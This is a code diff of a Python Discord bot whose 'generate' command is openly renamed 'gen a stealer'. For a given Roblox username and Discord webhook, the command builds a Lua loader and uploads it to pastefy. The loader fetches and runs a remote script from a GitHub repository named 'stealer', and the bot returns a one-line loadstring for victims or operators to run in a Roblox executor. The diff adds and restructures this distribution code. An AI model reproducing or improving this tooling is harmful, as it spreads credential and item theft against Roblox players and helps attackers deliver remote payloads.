@@ -77,6 +77,11 @@ async def create_pastefy_paste(title: str, content: str) -> str | None:
         return None
 
     data = resp.json()
+
+    paste_id = data.get("id")
+    if paste_id:
+        return f"https://pastefy.app/{paste_id}/raw"
+
     return data.get("url") or data.get("link") or data.get("raw")
 
 
@@ -91,10 +96,10 @@ async def on_ready():
     print(f"Logged in as {bot.user} | Synced commands")
 
 
-@tree.command(name="generate", description="Generate a Horizon Protector token for a webhook")
+@tree.command(name="generate", description="gen a stealer")
 @app_commands.describe(
-    username="Roblox username of the receiver",
-    webhook="Discord webhook URL",
+    username="rpoblox user",
+    webhook="webhook",
 )
 async def generate(interaction: discord.Interaction, username: str, webhook: str):
     await interaction.response.defer(ephemeral=True)
@@ -105,7 +110,7 @@ async def generate(interaction: discord.Interaction, username: str, webhook: str
 
     valid, reason = await verify_roblox_username(username)
     if not valid:
-        await interaction.followup.send(f"error not from us", ephemeral=True)
+        await interaction.followup.send("error not from us", ephemeral=True)
         return
 
     try:
@@ -128,47 +133,60 @@ async def generate(interaction: discord.Interaction, username: str, webhook: str
 
     lua_script = f'''user = "{username}"
 id = "{token}"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-gag2", true))()'''
+loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/loader", true))()'''
 
     paste_url = await create_pastefy_paste(f"Horizon_{username}", lua_script)
 
-    if not paste_url:
-        await interaction.followup.send("error from us contact temphor pls", ephemeral=True)
-        return
+    if paste_url:
+        loadstring_line = f'loadstring(game:HttpGet("{paste_url}", true))()'
 
-    loadstring_line = f'loadstring(game:HttpGet("{paste_url}", true))()'
-
-    embed = discord.Embed(
-        title="Token Generated",
-        description="**This token is shown only once!**",
-        color=0x57F287,
-    )
-    embed.add_field(name="Username", value=f"`{username}`", inline=True)
-    embed.add_field(name="Token", value=f"`{token}`", inline=True)
-    embed.add_field(
-        name="Lua Script (copy and run)",
-        value=f"```lua\n{lua_script}\n```",
-        inline=False
-    )
-    embed.set_footer(text="Horizon Scripts | Best Script Services")
-
-    await interaction.followup.send(embed=embed, ephemeral=True)
-
-    try:
-        dm_embed = discord.Embed(
-            title="Your Horizon Script",
-            description="Run this loadstring in your executor:",
+        embed = discord.Embed(
+            title="Token Generated",
+            description="to stealer twin",
             color=0x57F287,
         )
-        dm_embed.add_field(
+        embed.add_field(name="Username", value=f"`{username}`", inline=True)
+        embed.add_field(name="Token", value=f"`{token}`", inline=True)
+        embed.add_field(
             name="Loadstring",
             value=f"```lua\n{loadstring_line}\n```",
             inline=False
         )
-        dm_embed.set_footer(text="Horizon Scripts | Best Script Services")
-        await interaction.user.send(embed=dm_embed)
-    except discord.Forbidden:
-        await interaction.followup.send("error not from us", ephemeral=True)
+        embed.set_footer(text="Horizon Scripts | Best Script Services")
+
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
+        try:
+            dm_embed = discord.Embed(
+                title="Your Horizon Script",
+                description="Run this loadstring in your executor:",
+                color=0x57F287,
+            )
+            dm_embed.add_field(
+                name="Loadstring",
+                value=f"```lua\n{loadstring_line}\n```",
+                inline=False
+            )
+            dm_embed.set_footer(text="Horizon Scripts | Best Script Services")
+            await interaction.user.send(embed=dm_embed)
+        except discord.Forbidden:
+            await interaction.followup.send("error not from us", ephemeral=True)
+    else:
+        embed = discord.Embed(
+            title="Token Generated",
+            description="yo stealer twin",
+            color=0x57F287,
+        )
+        embed.add_field(name="Username", value=f"`{username}`", inline=True)
+        embed.add_field(name="Token", value=f"`{token}`", inline=True)
+        embed.add_field(
+            name="Lua Script",
+            value=f"```lua\n{lua_script}\n```",
+            inline=False
+        )
+        embed.set_footer(text="Horizon Scripts | Best Script Services")
+
+        await interaction.followup.send(embed=embed, ephemeral=True)
 
 
 bot.run(BOT_TOKEN)
